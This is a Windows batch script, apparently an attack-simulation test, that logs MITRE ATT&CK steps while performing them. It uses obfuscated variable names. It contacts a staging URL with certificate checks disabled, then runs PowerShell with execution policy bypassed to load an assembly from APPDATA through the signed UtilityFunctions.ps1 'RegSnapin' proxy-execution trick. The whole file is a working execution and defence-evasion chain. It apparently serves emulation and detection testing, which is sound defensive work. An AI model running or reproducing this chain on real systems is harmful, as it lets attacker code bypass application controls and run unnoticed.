@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET pjkcpgw=%APPDATA%\10052\9ef64ecf
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?10052-10
SET hlbnp=ITZEL-S2B
SET pudaazx=10
SET syjfr=visio.txt
SET ewjmdkff=10052

SET vxcb=!DATE!/!TIME!
SET qwert=!APPDATA!\!pudaazx!
SET mnbv=!qwert!\macula-simulations.log

echo [!vxcb!][DEBUG][!hlbnp!][!ewjmdkff!]: heartbeat_start>> "!mnbv!" 2>nul
curl -k -s -o nul "!drguvr!"
echo [!vxcb!][DEBUG][!hlbnp!][!ewjmdkff!]: heartbeat_complete>> "!mnbv!" 2>nul

SET mkoi=1
SET plkj=
IF NOT ERRORLEVEL 0 (
    SET mkoi=0
    SET plkj=connection_failed
)
SET ttp_time=!TIME!
IF "!ttp_time:~0,1!"==" " SET ttp_time=0!ttp_time:~1!
SET ttp_ts=!DATE:~10,4!-!DATE:~4,2!-!DATE:~7,2! !ttp_time:~0,8!.!ttp_time:~9,2!0
echo [!ttp_ts!][TTP][!hlbnp!][!ewjmdkff!]: T1105|Ingress Tool Transfer=!mkoi!:!plkj!>> "!mnbv!" 2>nul

SET lpoi=c:\windows\diagnostics\system\networking
echo [!vxcb!][DEBUG][!hlbnp!][!ewjmdkff!]: chdir_start>> "!mnbv!" 2>nul
cd /d "!lpoi!" >nul 2>&1
echo [!vxcb!][DEBUG][!hlbnp!][!ewjmdkff!]: chdir_result=!ERRORLEVEL!>> "!mnbv!" 2>nul

echo [!vxcb!][DEBUG][!hlbnp!][!ewjmdkff!]: utilityfunctions_start>> "!mnbv!" 2>nul
SET jhgf="set-location -path !lpoi!; import-module .\UtilityFunctions.ps1; RegSnapin !pjkcpgw!\!syjfr!;[Program.Class]::Dale()"
powershell.exe -ep bypass -command !jhgf!

SET qazx=1
SET wsxc=
IF NOT ERRORLEVEL 0 (
    SET qazx=0
    SET wsxc=assembly_load_failed
)
SET ttp_time=!TIME!
IF "!ttp_time:~0,1!"==" " SET ttp_time=0!ttp_time:~1!
SET ttp_ts=!DATE:~10,4!-!DATE:~4,2!-!DATE:~7,2! !ttp_time:~0,8!.!ttp_time:~9,2!0
echo [!ttp_ts!][TTP][!hlbnp!][!ewjmdkff!]: T1218|Signed Script Proxy Execution=!qazx!:!wsxc!>> "!mnbv!" 2>nul